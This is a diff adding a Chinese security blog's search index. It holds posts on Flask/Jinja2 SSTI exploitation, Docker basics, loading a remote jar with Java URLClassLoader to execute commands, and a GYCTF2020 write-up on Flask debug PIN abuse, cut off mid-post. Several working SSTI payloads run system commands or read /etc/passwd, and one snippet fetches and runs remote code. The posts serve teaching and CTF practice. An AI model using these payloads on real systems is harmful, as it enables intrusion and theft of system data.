@@ -1,0 +1,361 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>FlaskSSTI利用</title>
+    <url>/2022/03/10/FlaskSSTI%E5%88%A9%E7%94%A8/</url>
+    <content><![CDATA[<h3 id="SSTI成因"><a href="#SSTI成因" class="headerlink" title="SSTI成因"></a>SSTI成因</h3><p>主要是一些编程语言的框架在使用模板渲染引擎的函数时代码不规范，过分信任用户的输入造成的模板注入，比如python的Jinja2 mako tornado django；php的smarty twig，java的jade velocity</p>
+<p>这里主要分析一下python的Flask，不着重Flask的语法，从代码的角度分析成因</p>
+<span id="more"></span>
+
+<p>首先来看两端代码</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    query = request.args.get(<span class="string">&#x27;name&#x27;</span>)<span class="comment"># 获取get方法传递的 name的值</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;demo_tmp.html&#x27;</span>, name = query)<span class="comment"># 将get接收到的name的值传入模板,进行渲染</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)  <span class="comment"># 开启 debug模式,每次修改代码后就不需要手动重启服务器,服务器会在代码修改后自动重新载入</span></span><br></pre></td></tr></table></figure>
+
+<p>创建一个放模板的templates目录，里面放入模板demo_tmp.html</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Welcome to Flask<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, &#123;&#123;name&#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>运行python代码</p>
+<p>在端口输入127.0.0.1:5000,运行</p>
+<p>pyhtonFlask使用的模板引擎是jinja2</p>
+<p><code>模板中使用 &#123;&#123; &#125;&#125; 语法表示一个变量,它是一种特殊的占位符.当利用jinja2进行渲染的时候,它会把这些特殊的占位符进行填充/替换,jinja2支持python中所有的Python数据类型比如列表、字段、对象等.</code></p>
+<p>我们传入参数49，可以看到输出</p>
+<img src="/2022/03/10/FlaskSSTI%E5%88%A9%E7%94%A8/image-20220313132852816.png" class>
+
+<p>没有输出49，说明不存在模板注入；</p>
+<p>在来看一段代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">from flask <span class="keyword">import</span> Flask</span><br><span class="line">from flask <span class="keyword">import</span> render_template</span><br><span class="line">from flask <span class="keyword">import</span> request</span><br><span class="line">from flask <span class="keyword">import</span> <span class="type">render_template_string</span></span><br><span class="line"></span><br><span class="line"><span class="variable">app</span> <span class="operator">=</span> Flask(__name__)</span><br><span class="line"><span class="meta">@app</span>.route(<span class="string">&quot;/index/&quot;</span>)</span><br><span class="line">def <span class="title function_">test</span><span class="params">()</span>:</span><br><span class="line">    Liwer = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    &lt;h1&gt;%s&lt;/h1&gt;</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span> % (request.args.get(<span class="string">&quot;name&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template_string(Liwer)</span><br><span class="line"></span><br><span class="line"><span class="type">if</span> <span class="variable">__name__</span> <span class="operator">=</span>= <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = True</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<p>这是一段存在SSTI的代码</p>
+<p>输入?name&#x3D;49输出</p>
+<img src="/2022/03/10/FlaskSSTI%E5%88%A9%E7%94%A8/image-20220313135542789.png" class>
+
+<p>对比上面两种代码，一个不会存在SSTI，一个存在；</p>
+<p>未产生漏洞的代码通过<code>render_template(&#39;demo_tmp.html&#39;, name = query)</code>进行渲染，要渲染的参数通过name &#x3D; query是写死的</p>
+<p>，用户不能控制；</p>
+<p>产生漏洞的的代码，将参数拼接到要渲染的Liwer参数中，如果我们的参数中存在<code>&#123;&#123;&#125;&#125;</code>，那么<code>render_template_string(template)</code>进行渲染的时候就会把 <code>&#123;&#123;&#125;&#125;</code>中的内容进行解析.</p>
+<h3 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h3><p>多数人就会想，既然存在注入那好办，直接<code>&#123;&#123;import os;os.system('')&#125;&#125;</code>命令执行，答案是不行的，</p>
+<p>jinja2引擎限制了使用import，这时候python的内置的一些属性就可以发挥作用了</p>
+<h4 id="魔术方法和内置属性"><a href="#魔术方法和内置属性" class="headerlink" title="魔术方法和内置属性"></a>魔术方法和内置属性</h4><p><code>__class__</code>:返回该实例对象的类</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line"><span class="comment"># &lt;class &#x27;str&#x27;&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>__base__</code>:返回该类的父类</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line"><span class="comment"># &lt;class &#x27;object&#x27;&gt;</span></span><br><span class="line"><span class="comment"># 及 object 是 str 的基类(父类)</span></span><br></pre></td></tr></table></figure>
+
+<p><code>__subclasses__</code>():返回当前类的所有子类,返回结果是个列表</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()</span><br><span class="line"><span class="comment">#[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, ...</span></span><br></pre></td></tr></table></figure>
+
+<p>通过这些内置方法和属性我们间接的获取到了一些类，由于无法import，而一些子类和父类导入了一些模块的，如果存在我们需要的类，我们只需要初始化这个类，在利用<code>__globals__</code>调用可利用的函数,就能够达成我们的目的.</p>
+<p>例如，我们要命令执行，可以执行system函数，那么我们就可以初始化这个类</p>
+<p><code>&lt;class &#39;os._wrap_close&#39;&gt;</code></p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>]</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/10/FlaskSSTI%E5%88%A9%E7%94%A8/image-20220313142007824.png" class>
+
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p><strong><code>__builtins__</code></strong></p>
+<p>python在启动时就加载<code>__builtins__</code>,里面包含了一些常用方法比如:<code>abs()</code>,<code>max()</code>,<code>eval()</code>等等;</p>
+<p>如何查找那些类存在<code>__builtins__</code>，使用脚本查找</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">exp_flask = <span class="string">&#x27;__builtins__&#x27;</span></span><br><span class="line">number = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;&quot;</span>.__class__.__base__.__subclasses__():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> exp_flask <span class="keyword">in</span> i.__init__.__globals__.keys():</span><br><span class="line">            <span class="built_in">print</span>(number,<span class="string">&quot;--&gt;&gt;&quot;</span>,i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        number += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/10/FlaskSSTI%E5%88%A9%E7%94%A8/image-20220313143651822.png" class>
+
+<p>到目前为止就可以简单的构建payload</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">128</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;calc.exe&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>成功弹出计算器</p>
+<img src="/2022/03/10/FlaskSSTI%E5%88%A9%E7%94%A8/image-20220313144624969.png" class>
+
+<p><strong><code>sys</code></strong></p>
+<p>通过上面的脚本查找sys</p>
+<p>构造payload</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">&#x27;sys&#x27;</span>].modules[<span class="string">&quot;os&quot;</span>].popen(<span class="string">&quot;whoami&quot;</span>).read()</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/10/FlaskSSTI%E5%88%A9%E7%94%A8/image-20220313145311172.png" class>
+
+<p><strong><code>__import__</code></strong></p>
+<p>同样使用脚本查找</p>
+<p>构造payload</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">75</span>].__init__.__globals__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;calc.exe&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>SSTI</category>
+      </categories>
+      <tags>
+        <tag>SSTI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Docker学习笔记一</title>
+    <url>/2022/02/17/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/</url>
+    <content><![CDATA[<h2 id="什么是Docker"><a href="#什么是Docker" class="headerlink" title="什么是Docker"></a>什么是Docker</h2><p>Docker 是一个开源的应用容器引擎，基于 <a href="https://www.runoob.com/go/go-tutorial.html">Go 语言</a> 并遵从 Apache2.0 协议开源。Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。</p>
+<span id="more"></span>
+
+<h2 id="Docker的架构"><a href="#Docker的架构" class="headerlink" title="Docker的架构"></a>Docker的架构</h2><ul>
+<li><p><strong>镜像（Image）</strong>：Docker 镜像（Image），就相当于是一个 root 文件系统。比如官方镜像 ubuntu:16.04 就包含了完整的一套 Ubuntu16.04 最小系统的 root 文件系统。</p>
+</li>
+<li><p><strong>容器（Container）</strong>：镜像（Image）和容器（Container）的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</p>
+</li>
+<li><p><strong>仓库（Repository）</strong>：仓库可看成一个代码控制中心，用来保存镜像。</p>
+<p>简单的来说，Docker镜像是创建Docker容器的<strong>模板</strong>，而容器是独立运行的一组应用，是镜像运行的<strong>实体</strong></p>
+</li>
+</ul>
+<h2 id="CentOS中Docker的安装"><a href="#CentOS中Docker的安装" class="headerlink" title="CentOS中Docker的安装"></a>CentOS中Docker的安装</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -r</span><br></pre></td></tr></table></figure>
+
+<p>检查系统内核版本，Docker安装的要求在系统内核版本3.10以上</p>
+<p><strong><img src="/2022/02/17/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20220217135102164.png" class></strong></p>
+<p>安装Docker</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum -y install docker</span><br></pre></td></tr></table></figure>
+
+<p>启用Docker</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl start docker</span><br></pre></td></tr></table></figure>
+
+<p>查看Docker的运行状态</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl status docker</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/02/17/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20220217135514649.png" class>
+
+<h2 id="Docker容器的简单使用"><a href="#Docker容器的简单使用" class="headerlink" title="Docker容器的简单使用"></a>Docker容器的简单使用</h2><h3 id="输入docker查看docker命令端所有的容器"><a href="#输入docker查看docker命令端所有的容器" class="headerlink" title="输入docker查看docker命令端所有的容器"></a>输入docker查看docker命令端所有的容器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker</span><br></pre></td></tr></table></figure>
+
+<h3 id="拉取镜像"><a href="#拉取镜像" class="headerlink" title="拉取镜像"></a>拉取镜像</h3><p>如果本地没有ubuntu镜像，可以使用</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull ubuntu</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/02/17/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20220217141601662.png" class>
+
+<h3 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h3><p>ubuntu镜像启动一个容器，<strong>参数</strong>是&#x2F;bin&#x2F;bash</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/02/17/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20220217142135201.png" class>
+
+<p>参数说明：</p>
+<ul>
+<li><strong>-i</strong>: 交互式操作。</li>
+<li><strong>-t</strong>: 终端。</li>
+<li><strong>ubuntu</strong>: ubuntu 镜像。</li>
+<li><strong>&#x2F;bin&#x2F;bash</strong>：放在镜像名后的是命令，这里我们希望有个交互式 Shell，因此用的是 &#x2F;bin&#x2F;bash。</li>
+</ul>
+<h3 id="退出容器"><a href="#退出容器" class="headerlink" title="退出容器"></a>退出容器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="查看停止运行的容器"><a href="#查看停止运行的容器" class="headerlink" title="查看停止运行的容器"></a>查看停止运行的容器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/02/17/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20220217142535446.png" class>
+
+<h3 id="启动一个已经停止运行的容器"><a href="#启动一个已经停止运行的容器" class="headerlink" title="启动一个已经停止运行的容器"></a>启动一个已经停止运行的容器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker start ed723b2f8e2c</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/02/17/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20220217142815802.png" class>
+
+<img src="/2022/02/17/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20220217142941017.png" class>
+
+<p>使用docker ps -a可以看到这个容器正处于up状态</p>
+<h3 id="后台运行容器"><a href="#后台运行容器" class="headerlink" title="后台运行容器"></a>后台运行容器</h3><p>使用-d参数</p>
+<p>运行后不会进入容器，容器将会在后台运行</p>
+<h3 id="停止一个容器"><a href="#停止一个容器" class="headerlink" title="停止一个容器"></a>停止一个容器</h3><p>使用stop命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop e86d01665a5b</span><br></pre></td></tr></table></figure>
+
+<p>  可以使用restart重启一个停止的容器</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker restart e86d01665a5b</span><br></pre></td></tr></table></figure>
+
+<h3 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h3><p>使用了-d命令，容器会进入后台运行，使用以下的命令可以进入容器</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker attach</span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span></span><br></pre></td></tr></table></figure>
+
+<p>两个方式有区别</p>
+<p><strong>attach进入容器退出终端时，会导致容器停止运行，但exec不会导致容器运行终止。（推荐使用exec）</strong></p>
+<h4 id="attach"><a href="#attach" class="headerlink" title="attach"></a>attach</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker attach  e86d01665a5b</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/02/17/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20220217144246697.png" class>
+
+<p>可以看到进入容器后，在退出，容器已经没有在后台运行</p>
+<h4 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">exec</span> -it e86d01665a5b /bin/bash</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/02/17/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/image-20220217144631385.png" class>
+
+<p>退出后容器任然在后台运行</p>
+<h3 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> -f e86d01665a5b</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>Docker学习</category>
+      </categories>
+      <tags>
+        <tag>Docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>利用UrlClassLoader远程加载jar包</title>
+    <url>/2022/03/07/%E5%88%A9%E7%94%A8UrlClassLoader%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDjar%E5%8C%85/</url>
+    <content><![CDATA[<h3 id="UrlClassLoader"><a href="#UrlClassLoader" class="headerlink" title="UrlClassLoader"></a>UrlClassLoader</h3><p>URLClassLoader继承了ClassLoader,可以加载本地磁盘和网络上的jar包，并调用其中的方法，在利用webshell时可以很好的使用此方法执行命令</p>
+<span id="more"></span>
+
+<p>首先在远程服务器上存在一个cmd.jar文件</p>
+<p><a href="https://anbai.io/tools/cmd.jar">https://anbai.io/tools/cmd.jar</a></p>
+<p>下载后通过XJad反编译查看java文件的代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CMD</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">CMD</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Process <span class="title function_">exec</span><span class="params">(String s)</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">throws</span> IOException</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> Runtime.getRuntime().exec(s);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在CMD.java中存在以一个CMD方法，存在一个参数执行命令</p>
+<p>使用UrlClassLoader加载此jar包</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.anbai.sec.classloader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creator: yz</span></span><br><span class="line"><span class="comment"> * Date: 2019/12/18</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestURLClassLoader</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 定义远程加载的jar路径</span></span><br><span class="line">            <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;https://anbai.io/tools/cmd.jar&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建URLClassLoader对象，并加载远程jar包</span></span><br><span class="line">            <span class="type">URLClassLoader</span> <span class="variable">ucl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;url&#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 定义需要执行的系统命令</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;calc.exe&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 通过URLClassLoader加载远程jar包中的CMD类</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">cmdClass</span> <span class="operator">=</span> ucl.loadClass(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 调用CMD类中的exec方法，等价于: Process process = CMD.exec(&quot;whoami&quot;);</span></span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> (Process) cmdClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(<span class="literal">null</span>, cmd);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取命令执行结果的输入流</span></span><br><span class="line">            <span class="type">InputStream</span>           <span class="variable">in</span>   <span class="operator">=</span> process.getInputStream();</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">byte</span>[]                b    = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="type">int</span>                   <span class="variable">a</span>    <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 读取命令执行结果</span></span><br><span class="line">            <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 输出命令执行结果</span></span><br><span class="line">            System.out.println(baos.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译运行后成功弹出计算器</p>
+<img src="/2022/03/07/%E5%88%A9%E7%94%A8UrlClassLoader%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BDjar%E5%8C%85/image-20220307201611048.png" class>
+
+
+
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>javasec</category>
+      </categories>
+      <tags>
+        <tag>java</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Flask开启debug的安全问题</title>
+    <url>/2022/03/16/Flask%E5%BC%80%E5%90%AFdebug%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
+    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>如果Flask开启了debug模式，在debug页面中包含了python的交互式shell，可以执行任意的python代码</p>
+<p>先来看一段代码</p>
+<span id="more"></span>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/index&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    <span class="keyword">return</span> Liwer</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">3000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+<p>显然这是一段错误的代码，第七行的Liwer没有定义，并且开启了debug模式，访问本地3000端口可以看到报错信息</p>
+<img src="/2022/03/16/Flask%E5%BC%80%E5%90%AFdebug%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20220316151727639.png" class>
+
+<p>看到了web应用目录，这些危害并不大，主要是如何进入python的交互式shell</p>
+<img src="/2022/03/16/Flask%E5%BC%80%E5%90%AFdebug%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20220316152538884.png" class>
+
+<p>这里需要输入一个PIN码</p>
+<h3 id="PIN码的安全性问题"><a href="#PIN码的安全性问题" class="headerlink" title="PIN码的安全性问题"></a>PIN码的安全性问题</h3><p>关于PIN码的生成，可以使用pdb对python进行调试，一步步跟进，可以看下这位师傅的解答，有点偏向二进制了</p>
+<p><a href="https://zhuanlan.zhihu.com/p/32336971">https://zhuanlan.zhihu.com/p/32336971</a></p>
+<p>总结一下PIN码生成流程就是【当前计算机用户名：XXX】、【[flask.app]】、【Flask】、【C:\Python27\lib\site-packages\flask\app.pyc】、【str(uuid.getnode())】、【get_machine_id()】组合获得，缺一不可。</p>
+<ol>
+<li><strong>flask所登录的用户名</strong></li>
+<li><strong>modname，一般为Flask.app</strong></li>
+<li>**getattr(app, “*<em>name*<em>”, app.*<em>class*</em>.*<em>name*</em>)。一般为Flask</em></em></li>
+<li><strong>flask库下app.py的绝对路径。这个可以由报错信息看出</strong></li>
+<li><strong>当前网络的mac地址的十进制数。</strong></li>
+<li><strong>机器的id。</strong></li>
+</ol>
+<p>如何利用呢？通过一道题来了解</p>
+<h3 id="l-GYCTF2020-FlaskApp"><a href="#l-GYCTF2020-FlaskApp" class="headerlink" title="l[GYCTF2020]FlaskApp"></a>l[GYCTF2020]FlaskApp</h3><p>打开后在这个页面出存在SSTI模板注入</p>
+
+
+<p>将14base64加密，输出14，存在模板注入，当然可以使用模板注入的方法拿到flag</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/this_is_the_fl&#x27;</span>+<span class="string">&#x27;ag.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p>另一种解法就是利用PIN码</p>
+<h5 id="获取flask用户名"><a href="#获取flask用户名" class="headerlink" title="获取flask用户名"></a>获取flask用户名</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/03/16/Flask%E5%BC%80%E5%90%AFdebug%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/image-20220316154627775.png" class>
+
+<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">flaskweb</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="获取app-py的绝对路径，"><a href="#获取app-py的绝对路径，" class="headerlink" title="获取app.py的绝对路径，"></a><strong>获取app.py的绝对路径，</strong></h5><p>在报错信息中可以看到</p>
